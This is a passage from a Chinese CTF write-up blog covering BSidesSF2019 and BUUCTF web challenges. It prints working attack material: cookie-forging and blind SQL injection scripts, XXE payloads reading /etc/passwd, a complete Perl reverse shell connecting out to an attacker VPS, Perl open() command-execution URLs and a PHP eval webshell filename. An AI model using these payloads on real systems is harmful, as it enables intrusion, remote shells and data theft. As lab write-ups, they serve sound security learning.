RSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA====\"hex = base64.b32decode(b32)print(hex)f1 = open(\"1.png\",'wb')f1.write(hex)f1.close() 然后拿到了如下一张图：后来得知是PDF417，然后到网上找了一下扫描的方法，这里和这里都可以识别，识别出了下面这个图：这里卡了好久，要不是就拿到了二血了…后来看到图片的标题F5得知是F5隐写，然后用F5-steganography跑出了flag。 这里偶然间发现了一个更好用的工具，输入morse码就直接出了PDF417的图，分享一下：CyberChef，只能说，师傅们tql!","link":"/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"},{"title":"BSidesSF2019-WriteUp","text":"最近BUU复现了BSidesSF2019几道题目，还比较简单，记录一下。 Futurella一道查看源码就能拿到flag的题目，令人开心的题目。不过谷歌翻译是真的强，连这种火星文都能翻译 Kookie简单的利用cookie拿admin权限的题目。 解题进入题目发现提示我们要以admin身份登录，但同时也给了一组用户名和密码guest/guest，用该用户登录抓包，发现cookie中存在字段username=，在后面加上admin然后放包即可拿到flag。 Pick-tac-toe考察条件竞争，题很简单。 解题进入题目是一个下井字棋的棋盘，查看源码，发现一部分代码如下： &lt;table id=\"board\"&gt; &lt;tr&gt; &lt;form id='form_ul' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='ul'&gt; &lt;td id='ul' onClick='$(\"#form_ul\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_u' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='u'&gt; &lt;td id='u' onClick='$(\"#form_u\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_ur' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='ur'&gt; &lt;td id='ur' onClick='$(\"#form_ur\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;form id='form_l' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='l'&gt; &lt;td id='l' onClick='$(\"#form_l\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_c' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='c'&gt; &lt;td id='c' onClick='$(\"#form_c\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_r' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='r'&gt; &lt;td id='r' onClick='$(\"#form_r\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;form id='form_bl' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='bl'&gt; &lt;td id='bl' onClick='$(\"#form_bl\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_b' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='b'&gt; &lt;td id='b' onClick='$(\"#form_b\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_br' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='br'&gt; &lt;td id='br' onClick='$(\"#form_br\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt;&lt;/table&gt; 可以猜测给出的是代表九个网格传的传值，通过POST传参，在/move页利用move参数传参以表示棋下的位置。当我们进行传参的时候，发现经过一段时间棋盘上才出现，起初以为是网速问题，其实这段时间是服务器处理的时间，这个时候我们再传两个位置，构成一条直线，这样服务器只能对我们下的第一步棋进行反应，但是反应过来，我们已经下了三步棋，赢了…这就是典型的条件竞争。 Mixer这个题目我觉得还是有水平的，主要考察了对cookie的攻击，但是结合了AES ECB模式加密的知识，这其实也是AES加密模式中很简单的了。 题目分析进入题目，我们发现又是一个登录框：还是提示我们要有admin权限，我们尝试用admin/admin登录，发现可以登录，但是第三个框的is_admin的值在输入的时候我们不能进行操作，从抓包效果来看，也不能进行更改：但是我们发现cookie中有user的字段，猜测其后面的值是经过AES ECB模式加密的，这里如果需要对加密的机制有更深的理解，可以去这里。验证一下我们的猜测：通过更改其中一个值看一下回显我们发现，传入的用户名、密码那三项其实是通过JSON传输的，即： {\"username\":\"admin\",\"password\":\"admin\",\"is_admin\":\"0\"} 从图中看到，当我们更改user中的一个值的时候，结果报了错误，因为JSON字符串已经变成了： {\"first_name\":\"a??N??ZP!z??gF???\":\"admin\",\"is_admin\":0} 也就是说确实是对这一串JSON格式的字符串进行了AES ECB模式的加密，并且是16字节为一组进行加密的，那么我们解题就有突破口了。获取flag我们需要构造如下的JSON串： {\"username\":\"admin\",\"password\":\"admin\",\"is_admin\":\"1\"} 但是is_admin的值我们没法通过输入来控制，但是观察发现：从JSON的起始位置到用户名的第一个字母刚好是16个字节，那么我们构造一个类似于a1.00000000000000(14个0，一共16字节)的用户名，以及一个4字节的密码，那就又拿到了一个16字节的分组1.00000000000000，并且其值为1，同时到第三个:刚好是64字节，而进行加密的时候是对整个16字节的块进行加密的，那么我们再把这一个分组加密的结果插入到最后的16字节的密文之前(hex编码是32个字符)即可令is_admin的值为1了，这个时候is_admin其实是1.000000000000000(15个0)了，但是不影响它是1，同时不影响最后一个分组的加密(不够16字节会自动填充的)。 解题构造username=a1.00000000000000&amp;password=admi登录之后，利用BP抓包将第二个16字节的密文替换掉最后的16字节的密文，放包即可拿到flag：用下面的脚本的话操作起来更简单： import requestsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)url = \"\"action=\"?action=login&amp;first_name=a1.00000000000000&amp;last_name=admi\"r = requests.get(url+action, verify=False, allow_redirects=False)for c in r.cookies: print(c.name, c.value) if c.name == \"user\": c.value = c.value[:-32] + c.value[32:64] + c.value[-32:]resp = requests.get(url, cookies = r.cookies, verify=False, allow_redirects=False)print resp.text Sequel在cookie处存在sql注入，利用盲注拿flag。 题目分析进入题目是一个只含用户名和密码的登录框，经过尝试guest/guest可以登录，登录之后发现是一个302跳转，同时看到了有点怪的cookie：对cookie的值进行base64解码： &gt;&gt;&gt; base64.b64decode(&quot;eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9&quot;)'{&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}' 可以看到用户名和密码是通过JSON编码传输的，那么JSON中的username或password会不会存在注入点呢？利用下面的payload测试一下： {\"username\":\"guest\\\" or \\\"A\\\"=\\\"A\",\"password\":\"guest\"} 注意这里的\\是用来转义的，防止在JSON中被编码了。然后对上面的JSON串进行base64加密，这里我们利用python的库进行加密，同时用r''告诉python不要把我们构造的\\再进行转义： &gt;&gt;&gt; base64.b64encode(r'{&quot;username&quot;:&quot;guest\\&quot; or \\&quot;A\\&quot;=\\&quot;A&quot;,&quot;password&quot;:&quot;guest&quot;}')'eyJ1c2VybmFtZSI6Imd1ZXN0XCIgb3IgXCJBXCI9XCJBIiwicGFzc3dvcmQiOiJndWVzdCJ9' 替换掉cookie中的内容之后放包发现回显如下：发现注入成功！这道题的数据库是sqlite，可以利用sqlite_master拿到库名，以便进一步的注入。写脚本利用盲注爆库名、表名、字段名，拿flag。脚本如下： import requestsimport stringimport base64URL = ''LETTERS = string.printabletarget = \"\"while True: f = False for e in LETTERS: tmp = target + e # 1.获取库名 payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) # 2.获取username #payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) # 3.获取password #payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) payload = base64.b64encode(payload.encode('utf-8')).decode(\"utf-8\") req = requests.Request( 'GET', URL, params={ }, cookies={ \"1337_AUTH\":payload } ) prepared = req.prepare() s = requests.Session() r = s.send(prepared, allow_redirects = False) if \"Movie\" in r.text: target = tmp print(target) f = True break if f: continue exit() 拿到用户名和密码：sequeladmin/f5ec3af19f0d3679e7d5a148f4ac323d，登录即可拿到flag。 SVGMagic考察XXE漏洞，在解析包含SVG可缩放矢量图形的XML文件时，构造XXE漏洞执行从而拿到服务器的目标文件。 知识扩展SVG可缩放矢量图形可以参考这里XXE漏洞参考这里和这里 解题进入题目，提示这个站可以实现SVG到PNG的转换，也就是说我们上传包含SVG信息的XML文件，那么将会返回一张PNG图片。SVG代码类似： &lt;html&gt;&lt;body&gt; &lt;h1&gt;My first SVG&lt;/h1&gt; &lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"&gt; &lt;circle cx=\"100\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\" /&gt;&lt;/svg&gt; &lt;/body&gt;&lt;/html&gt; 既然与XML的解析相关，那就考虑XXE攻击。首先构造如下的XML脚本： &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;&lt;svg height=\"300\" width=\"200\"&gt; &lt;text x=\"0\" y=\"15\" fill=\"red\"&gt;test &amp;xxe; test&lt;/text&gt;&lt;/svg&gt; 上传之后，发现回显如下：由此可见，我们上传的包含XXE攻击的脚本成功执行了，现在就想办法就拿到flag，那就需要找到flag文件的位置。 这个地方学到了新东西：利用linux系统的proc进程文件系统找当前进程中的文件，这个地方参考了网上的题解，虽然没有成功，但是还是学到了新东西，感觉以后会用得到。关于proc进程文件系统参考这里。 最后拿到flag的payload如下： &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:flag.txt\"&gt; ]&gt;&lt;svg height=\"300\" width=\"3000\"&gt; &lt;text x=\"0\" y=\"15\" fill=\"red\"&gt;test &amp;xxe; test&lt;/text&gt;&lt;/svg&gt; 利用file命令直接读flag文件，即可拿到flag。 看国外大佬的题解，讲到了刚开始想到了ImageTragick，也是之前不熟悉的知识，需要好好学习，参考这里。 赛题BUU上都可以复现","link":"/2020/02/18/BSidesSF2019-WriteUp/"},{"title":"BUUCTF-web刷题Ⅲ","text":"BUU刷题记录之三了，刷题果然开眼界，不过… 我好菜😐，不是那个蔡😒 [HITCON 2017]SSRFme主要考察Perl下存在的漏洞：CVE-2016-1238和open命令导致命令执行的漏洞。利用此漏洞进行SSRF。 题目分析进入题目，给出了如下的源码： &lt;?php $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); 同时也给出了REMOTE_ADDR，这在后面解题用得到。分析代码我们可以梳理出其逻辑： 1.基于REMOTE_ADDR创建沙箱文件夹；2.将传入的URL带入命令GET执行。这里的GET命令是Lib for WWW in Perl中的命令，目的是模拟http的GET请求；3.利用pathinfo函数解析传入的filename参数，获取路径名最后一层文件夹创建并进入该路径；4.利用basename函数获取filename传参内容的最后以及文件夹名称；5.利用​file_put_contents函数将GET命令执行的结果写入以filename中的文件名命名的文件中。 这一道题涉及的知识之前没遇到过，需要好好学一学，参考网上的题解得知有两种解题思路： 利用Perl5的一个CVE 利用Perl的open命令进行命令执行 利用CVE-2016-1238漏洞大致构成原因是：` 当解析遇到了非定义的协议(定义的协议在perl5/LWP/Protocol文件夹下可以看到，默认支持GHTTP、cpan、data、file、ftp、gopher、http、https、loopback、mailto、nntp、nogo协议)时, 如GGBON://ggb0n.com，会自动读取当前目录下的URI目录并查看是否有对应协议的pm模块并尝试eval &quot;require xxx&quot;，这里我们的恶意pm模块就会被执行。 借此漏洞构造一个反弹shell的perl脚本放到自己的VPS上： #!/usr/bin/perl -w# perl-reverse-shell - A Reverse Shell implementation in PERLuse strict;use Socket;use FileHandle;use POSIX;my $VERSION = \"1.0\";# Where to send the reverse shell. Change these.my $ip = '127.0.0.1';my $port = 12345;# Optionsmy $daemon = 1;my $auth = 0; # 0 means authentication is disabled and any # source IP can access the reverse shellmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);# Declarationsmy $global_page = \"\";my $fake_process_name = \"/usr/sbin/apache\";# Change the process name to be less conspicious$0 = \"[httpd]\";# Authenticate based on source IP address if requiredif (defined($ENV{'REMOTE_ADDR'})) { cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\"); if ($auth) { unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) { cgiprint(\"ERROR: Your client isn't authorised to view this page\"); cgiexit(); } }} elsif ($auth) { cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access\"); cgiexit(0);}# Background and dissociate from parent process if requiredif ($daemon) { my $pid = fork(); if ($pid) { cgiexit(0); # parent exits } setsid(); chdir('/'); umask(0);}# Make TCP connection for reverse shellsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) { cgiprint(\"Sent reverse shell to $ip:$port\"); cgiprintpage();} else { cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\"); cgiexit(); }# Redirect STDIN, STDOUT and STDERR to the TCP connectionopen(STDIN, \"&gt;&amp;SOCK\");open(STDOUT,\"&gt;&amp;SOCK\");open(STDERR,\"&gt;&amp;SOCK\");$ENV{'HISTFILE'} = '/dev/null';system(\"w;uname -a;id;pwd\");exec({\"/bin/sh\"} ($fake_process_name, \"-i\"));# Wrapper around printsub cgiprint { my $line = shift; $line .= \"&lt;p&gt;\\n\"; $global_page .= $line;}# Wrapper around exitsub cgiexit { cgiprintpage(); exit 0; # 0 to ensure we don't give a 500 response.}# Form HTTP response using all the messages gathered by cgiprint so farsub cgiprintpage { print \"Content-Length: \" . length($global_page) . \"\\r Connection: close\\r Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;} 然后利用代码的逻辑构造payload： /?url=your vps's perl backdoor&amp;filename=URI/ggb0n.pm 这就在沙箱文件夹的URL下写入了反弹shell的pm文件，最后在个人的VPS上监听pm文件中写好的端口并构造如下的payload进行访问： /?url=GGBON://ggb0n.com&amp;filename=xxx 即可拿到shell。注意：这里的GGBON可以为任意的不属于上面说到的可以解析的字符串。 利用perl的open命令进行SSRF首先扩展一下open命令导致命令执行的过程，参考网上的资料： Executing Programs with “open”In addition to what we saw last week, the “open” command has one more verypowerful application: it allows you to execute a command, send input andreceive output.Try this program (it only works on Unix): #!/usr/bin/perl -w use strict; open DATA, \"who |\" or die \"Couldn't execute program: $!\"; while ( defined( my $line = &lt;DATA&gt; ) ) { chomp($line); print \"$line\\n\"; } close DATA; Here’s what happened: Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”‘s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. In this case, we “read” data from the command. To execute a command that we can “write” (send data) to, we should place a pipe character BEFORE the command. These options are mutually exclusive: we can read from a command or write to it, but not both. In the Unix world, a lot can be done by piping the output of one program into the input of another. Perl continues this spirit. Note that we can also send command-line parameters to the command, like this: open DATA, \"who -H |\" or die \"Couldn't execute program: $!\"; In fact, Perl allows you to use “open” to do pretty much anything you would normally do on the command-line, as this example demonstrates: open OUTPUT, \"| grep 'foo' &gt; result.txt\" or die \"Failure: $!\"; We can then write whatever we want to the “OUTPUT” filehandle. The Unix “grep” command will filter out any text which doesn’t contain the text “foo”; any text which DOES contain “foo” will be written to “result.txt”. perl下open命令的feature代码处理file协议的代码在perl5/LWP/Protocol/file.pm下： ...#第47行 # test file exists and is readable unless (-e $path) { return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND, \"File `$path' does not exist\"); } unless (-r _) { return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN, 'User does not have read permission'); }...#第127行 # read the file if ($method ne \"HEAD\") { open(F, $path) or return new HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR, \"Cannot read file '$path': $!\"); binmode(F); $response = $self-&gt;collect($arg, $response, sub { my $content = \"\"; my $bytes = sysread(F, $content, $size); return \\$content if $bytes &gt; 0; return \\ \"\"; }); close(F); }... 首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件, 所以先请求： /?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 然后请求如下的payload来创建相应的同名文件： /?url=file:bash -c /readflag|&amp;filename=123 最后利用open的feature执行代码访问/sandbox/哈希值/123就能得到flag。 其实还不是很懂，先留在这，再慢慢学习。 [RoarCTF 2019]Online ProxyXFF处存在二次注入 解题进入题目查看源码发现： &lt;!-- Debug Info: Duration: 0.029144048690796 s Current Ip: 174.0.81.45 --&gt; 这里提示当前的IP，想到利用工具改一下XFF试试，结果发现回显如下： &lt;!-- Debug Info: Duration: 0.035063982009888 s Current Ip: 127.0.0.1 Last Ip: 174.0.81.45 --&gt; 说明了上一个IP被记录了起来，当然也只能是记录在数据库中，那么如果构造一个SQL注入语句的XFF头上传，然后再随便换一个XFF头访问，不就是可以出发二次注入了吗，最终用赵师傅的脚本跑出了结果。参考赵师傅的脚本： import requeststarget = \"http://node3.buuoj.cn:28041/\"def execute_sql(sql): print(\"[*]请求语句：\" + sql) return_result = \"\" payload = \"0'|length((\" + sql + \"))|'0\" session = requests.session() r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --&gt;\", start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\"[+]长度：\" + str(length)) for i in range(1, length + 1, 5): payload = \"0'|conv(hex(substr((\" + sql + \"),\" + str(i) + \",5)),16,10)|'0\" r = session.get(target, headers={'X-Forwarded-For': payload}) # 将语句注入 r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) # 查询上次IP时触发二次注入 r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) # 再次查询得到结果 start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --&gt;\", start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8') print(\"[+]位置 \" + str(i) + \" 请求五位成功:\" + bytes.fromhex(hex(result)[2:]).decode('utf-8')) return return_result# 获取数据库print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\"))# 获取数据库表print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'\"))# 获取数据库表print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' \"))# 获取表中内容print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\")) [Black Watch 入群题]Web考察异或注入 题目分析进入题目看到如下的界面：点击热点列表里面的字的时候会跳转到另一个页面，同时还有登录页面，起初猜测是注入是在登录页面，那里通过JSON对username和password进行传参，前面做了JSON中进行注入的题目，但是这道题的注入点其实是在跳转的那个页面，抓包可以发现：这个页面是利用GET方式直接进行id传参的，存在注入的可能性更大，后来印证是异或注入，用脚本跑。 解题脚本import requestsimport urllibimport sysfrom time import sleep# if correct , return empty, else return somethingurl = \"http://c385297f-15e1-4d95-a39b-3f2aa03b3822.node3.buuoj.cn/backend/content_detail.php?id=\"#payload = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{0},1))&gt;{1})\"# [+] --&gt;admin,contents&lt;--#payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),{0},1))&gt;{1})\"# id,title,content,is_enable#payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),{0},1))&gt;{1})\"# id,username,password,is_enable#payload = \"1^(ord(substr((select(group_concat(password))from(admin)),{0},1))&gt;{1})\"payload = \"1^(ord(substr((select(group_concat(username))from(admin)),{0},1))&gt;{1})\"result = \"\"index = 1while True: u_bound = 255; l_bound = 0 while u_bound &gt;= l_bound: m_bound = (u_bound + l_bound) // 2 payload_tmp = payload.format(index, m_bound) url_tmp = url + urllib.parse.quote(payload_tmp) res = requests.get(url_tmp).content.decode('utf8') # print(res) # exit(0) # sleep(1) if \"title\" in res: u_bound = m_bound - 1 tmp = m_bound else: l_bound = m_bound + 1 # print(tmp) result += chr(tmp) index += 1 # sys.stdout.write(\"[+] --&gt;%s&lt;--\\r\" % (result)) # sys.stdout.flush() print(result) 跑出来两组用户名和密码，组合尝试就行了。 [HarekazeCTF2019]encode_and_encode考察通过JSON转义字符串绕过 题目分析进入题目，在第三个按钮看到源码： &lt;?phperror_reporting(0);if (isset($_GET['source'])) { show_source(__FILE__); exit();}function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true;}$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) { $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \"&lt;p&gt;not found&lt;/p&gt;\\n\"; }} else { $content = '&lt;p&gt;invalid request&lt;/p&gt;';}// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content);echo json_encode(['content' =&gt; $content]); 通过审计代码发现，is_valid()函数中通过黑名单过滤了一些字符串，基本上都是可能用到的协议。然后我们发现body的值是通过file_get_contents('php://input')传过来的，查了一下涨知识了： 如果POST的原始数据是一维数组或&amp;拼接的标准格式的键值对字符串，那么可以用$_POST来获取。如果发送json字符串，一般要通过file_get_contents获取。 因为这里是通过JSON编码传输的，因此用这种方式，然后对body的值进行解码并赋值给json。然后再利用自定义的is_valid()函数进行判断，并且可以看出json中有page这个键值对。思路就很明显了，我们需要通过JSON传输数据来读取到flag，这里就需要用到php的伪协议了，但是php已经被ban了，但是的但是：\\uXXXX可以在JSON中转义字符，例如A=\\u0041，因此利用这个特性来进行绕过。 解题最终构造的payload如下： {\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}/* \\u0070\\u0068\\u0070表示php；\\u0066\\u006c\\u0061\\u0067表示flag */ 成功拿到flag： [CISCN 2019]Easyweb敏感文件泄露，文件上传时短标签绕过php过滤 题目分析进入题目，访问robots.txt发现源码备份文件，下载到iamge.php.bak，源码如下： &lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); 审计代码发现应该需要进行sql注入，但是单引号被过滤掉了。由于转义函数addslashes的存在，同时\\0、'被过滤，所以可以输入\\0，经过addslashes函数会先变成\\\\0,然后经过str_replace函数，会变成\\，这样，就把id后面的单引号给转义了。所以可以构造类似下面的payload： http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\0'&amp;path= or 1=1%23 后台执行的sql语句便是： select * from images where id='\\' or path=' or 1=1# 从而绕过了过滤，那么利用这一点写脚本注入： import requestsimport timename=''for j in range(1,21): l = 32 h = 127 while abs(l-h)&gt;1: i=int((l+h)/2) url=\"http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\\\0'&amp;path= or ascii(substr((select password from users),\"+str(j)+\",1))&gt;\"+str(i)+\"%23\" r = requests.get(url) time.sleep(0.005) if r.status_code=='429': print('to fast') if not 'Content-Length' in r.headers: l = i else: h = i name += chr(h)print(name) 拿到密码之后，用admin身份登录，发现需要进行文件上传，并且会将文件名和用户名写入日志文件。由于日志文件的格式是php的，因此考虑写入shell。这里由于用户名已经是admin不可变的，那就需要在文件名上做手脚，但是文件名进行了php/i的过滤，此处利用短标签绕过： filename=\"&lt;?=$_GET['cmd']; eval($_POST['cmd']); ?&gt;\" 关于短标签扩展一下： 短标签&lt;? ?&gt;需要php.ini开启short_open_tag = On，但&lt;?= ?&gt;不受该条控制。 上传小马之后，得到如下的文件名，然后蚁剑连接拿到shell，即可拿到flag。 [GXYCTF2019]BabySQli考察点：多次编码(base32、base64)，union select注入结合md5通过后台判断。 题目分析随便输入用户名密码后，查看源码发现一串base32： 